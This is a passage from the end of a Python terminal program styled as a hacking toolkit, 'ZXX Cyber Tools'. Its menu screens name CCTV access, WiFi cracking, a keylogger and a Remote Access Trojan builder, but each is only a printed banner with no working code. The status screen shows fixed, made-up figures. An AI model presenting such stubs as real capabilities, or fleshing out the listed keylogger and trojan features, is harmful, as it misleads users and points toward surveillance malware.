        input(Fore.CYAN + "\n[→] Press ENTER to continue...")
    
    def cctv_scanner(self):
        clear_screen()
        print(Fore.RED + "\n[!] CCTV SCANNER")
        print(Fore.YELLOW + "[!] Find and access public CCTV cameras")
        
        input(Fore.CYAN + "\n[→] Press ENTER to continue...")
    
    def dark_web_access(self):
        clear_screen()
        print(Fore.BLACK + Back.WHITE + "\n[!] DARK WEB ACCESS" + Style.RESET_ALL)
        print(Fore.RED + "[!] Access dark web with Tor and VPN")
        
        input(Fore.CYAN + "\n[→] Press ENTER to continue...")
    
    def port_scanner(self):
        clear_screen()
        print(Fore.YELLOW + "\n[!] PORT SCANNER")
        print(Fore.GREEN + "[+] Advanced port scanning capabilities")
        
        input(Fore.CYAN + "\n[→] Press ENTER to continue...")
    
    def wifi_tools(self):
        clear_screen()
        print(Fore.CYAN + "\n[!] WiFi TOOLS")
        print(Fore.GREEN + "[+] WiFi network analysis and cracking")
        
        input(Fore.CYAN + "\n[→] Press ENTER to continue...")
    
    def keylogger(self):
        clear_screen()
        print(Fore.RED + "\n[!] KEYLOGGER")
        print(Fore.YELLOW + "[!] Keystroke logging and monitoring")
        
        input(Fore.CYAN + "\n[→] Press ENTER to continue...")
    
    def rat_builder(self):
        clear_screen()
        print(Fore.MAGENTA + "\n[!] RAT BUILDER")
        print(Fore.YELLOW + "[!] Remote Access Trojan builder")
        
        input(Fore.CYAN + "\n[→] Press ENTER to continue...")
    
    def crypto_tools(self):
        clear_screen()
        print(Fore.GREEN + "\n[!] CRYPTO TOOLS")
        print(Fore.CYAN + "[+] Cryptography and encryption tools")
        
        input(Fore.CYAN + "\n[→] Press ENTER to continue...")
    
    def forensic_tools(self):
        clear_screen()
        print(Fore.BLUE + "\n[!] FORENSIC TOOLS")
        print(Fore.WHITE + "[+] Digital forensics and analysis")
        
        input(Fore.CYAN + "\n[→] Press ENTER to continue...")
    
    def malware_analysis(self):
        clear_screen()
        print(Fore.RED + "\n[!] MALWARE ANALYSIS")
        print(Fore.YELLOW + "[!] Malware analysis and reverse engineering")
        
        input(Fore.CYAN + "\n[→] Press ENTER to continue...")
    
    def vpn_tools(self):
        clear_screen()
        print(Fore.CYAN + "\n[!] VPN TOOLS")
        print(Fore.GREEN + "[+] VPN configuration and testing")
        
        input(Fore.CYAN + "\n[→] Press ENTER to continue...")
    
    def proxy_tools(self):
        clear_screen()
        print(Fore.YELLOW + "\n[!] PROXY TOOLS")
        print(Fore.WHITE + "[+] Proxy servers and anonymity")
        
        input(Fore.CYAN + "\n[→] Press ENTER to continue...")
    
    def steganography(self):
        clear_screen()
        print(Fore.MAGENTA + "\n[!] STEGANOGRAPHY")
        print(Fore.CYAN + "[+] Hide data in images and files")
        
        input(Fore.CYAN + "\n[→] Press ENTER to continue...")
    
    def system_status(self):
        clear_screen()
        print(Fore.GREEN + "╔══════════════════════════════════════════════════════════╗")
        print(Fore.GREEN + "║                    SYSTEM STATUS                         ║")
        print(Fore.GREEN + "╚══════════════════════════════════════════════════════════╝")
        
        status = f"""
        [+] System Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
        [+] Tool Version: {VERSION}
        [+] Database: {DATABASE_FILE}
        [+] Tools Available: 20/80
        [+] Memory Usage: {psutil.virtual_memory().percent}%
        [+] CPU Usage: {psutil.cpu_percent()}%
        
        [+] Database Statistics:
          • Users: {self.db.cursor.execute("SELECT COUNT(*) FROM users").fetchone()[0]}
          • Attacks Logged: {self.db.cursor.execute("SELECT COUNT(*) FROM attack_logs").fetchone()[0]}
          • Scan Results: {self.db.cursor.execute("SELECT COUNT(*) FROM scan_results").fetchone()[0]}
          • OSINT Data: {self.db.cursor.execute("SELECT COUNT(*) FROM osint_data").fetchone()[0]}
        
        [+] System Status: OPERATIONAL
        [+] License: VALID (ZXX)
        [+] Updates: AVAILABLE
        """
        
        print(Fore.CYAN + status)
        input(Fore.CYAN + "\n[→] Press ENTER to continue...")
    
    def settings(self):
        clear_screen()
        print(Fore.YELLOW + "\n[!] SETTINGS")
        
        print(Fore.CYAN + "\n[+] Available settings:")
        print(Fore.WHITE + "  1. Change interface color")
        print(Fore.WHITE + "  2. Configure database")
        print(Fore.WHITE + "  3. Update tool")
        print(Fore.WHITE + "  4. Reset all data")
        print(Fore.WHITE + "  5. Backup configuration")
        
        input(Fore.CYAN + "\n[→] Press ENTER to continue...")
    
    def run(self):
        while self.running:
            self.display_menu()
            choice = input(Fore.CYAN + "\n[→] Select option [0-20]: " + Fore.WHITE)
            self.handle_choice(choice)
        
        print(Fore.YELLOW + "\n[!] Exiting ZXX Cyber Tools...")
        time.sleep(1)
        print(Fore.GREEN + "[✓] Thank you for using our tools!")
        print(Fore.CYAN + "[+] Remember: Use responsibly for educational purposes only")
        time.sleep(2)

# ============================================
# MAIN PROGRAM
# ============================================
def main():
    try:
        welcome_animation()
        
        login_system = AdvancedLoginSystem()
        if login_system.run():
            main_menu = MainMenuSystem()
            main_menu.run()
    
    except KeyboardInterrupt:
        print(Fore.RED + "\n\n[✗] Program interrupted by user")
        sys.exit(0)
    
    except Exception as e:
        print(Fore.RED + f"\n[✗] Critical error: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)

# ============================================
# PROGRAM START
# ============================================
if __name__ == "__main__":
    main()
